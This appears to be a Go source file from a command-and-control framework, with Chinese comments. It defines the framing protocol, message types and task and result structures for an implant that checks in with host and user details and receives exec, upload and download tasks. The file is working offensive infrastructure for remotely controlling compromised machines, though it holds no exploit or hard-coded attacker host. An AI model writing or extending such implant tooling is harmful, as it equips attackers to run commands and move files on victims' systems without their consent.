package c2

// 帧格式：[u32be len][u8 type][u32be id][payload]，len = 5 + len(payload)。
// 明文帧只用于 hello/心跳；任务与结果 payload 经 Envelope 加密。

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
)

const (
	MsgHello     byte = 0x01 // 植入端上线（明文：token/key/id/os/arch/user）
	MsgWelcome   byte = 0x02 // 平台确认（明文：ok）
	MsgTask      byte = 0x03 // 下发任务（密文 JSON）
	MsgResult    byte = 0x04 // 回传结果（密文 JSON）
	MsgHeartbeat byte = 0x05 // 心跳（明文）
	MsgBye       byte = 0x06 // 下线（明文）
)

// MaxFramePayload 是单帧载荷上限（防内存放大攻击）。
const MaxFramePayload = 8 << 20

type Frame struct {
	Type    byte
	ID      uint32
	Payload []byte
}

func WriteFrame(w io.Writer, f *Frame) error {
	if len(f.Payload) > MaxFramePayload {
		return fmt.Errorf("c2 帧过大: %d", len(f.Payload))
	}
	hdr := make([]byte, 9)
	binary.BigEndian.PutUint32(hdr[0:4], uint32(5+len(f.Payload)))
	hdr[4] = f.Type
	binary.BigEndian.PutUint32(hdr[5:9], f.ID)
	if _, err := w.Write(hdr); err != nil {
		return err
	}
	_, err := w.Write(f.Payload)
	return err
}

func ReadFrame(r io.Reader) (*Frame, error) {
	hdr := make([]byte, 9)
	if _, err := io.ReadFull(r, hdr); err != nil {
		return nil, err
	}
	l := int64(binary.BigEndian.Uint32(hdr[0:4])) - 5
	if l < 0 || l > MaxFramePayload {
		return nil, fmt.Errorf("c2 帧长度非法: %d", l)
	}
	p := make([]byte, l)
	if _, err := io.ReadFull(r, p); err != nil {
		return nil, err
	}
	return &Frame{Type: hdr[4], ID: binary.BigEndian.Uint32(hdr[5:9]), Payload: p}, nil
}

// Task 是下发给植入端的一条任务。
type Task struct {
	ID      uint32 `json:"id"`
	Kind    string `json:"kind"` // exec|upload|download|sleep
	Args    string `json:"args"`
	Timeout int    `json:"timeout_sec,omitempty"`
}

// Result 是植入端回传的任务结果。
type Result struct {
	TaskID   uint32 `json:"task_id"`
	ExitCode int    `json:"exit_code"`
	Output   string `json:"output"`
	Err      string `json:"err,omitempty"`
}

// HelloPayload 是植入端首帧内容。
type HelloPayload struct {
	Token string `json:"token"`
	Key   string `json:"key"`
	ID    string `json:"id"`
	OS    string `json:"os"`
	Arch  string `json:"arch"`
	User  string `json:"user"`
}

func encode(v any) ([]byte, error) { return json.Marshal(v) }

func decode(b []byte, v any) error {
	if len(b) == 0 {
		return fmt.Errorf("c2 消息为空")
	}
	return json.Unmarshal(b, v)
}
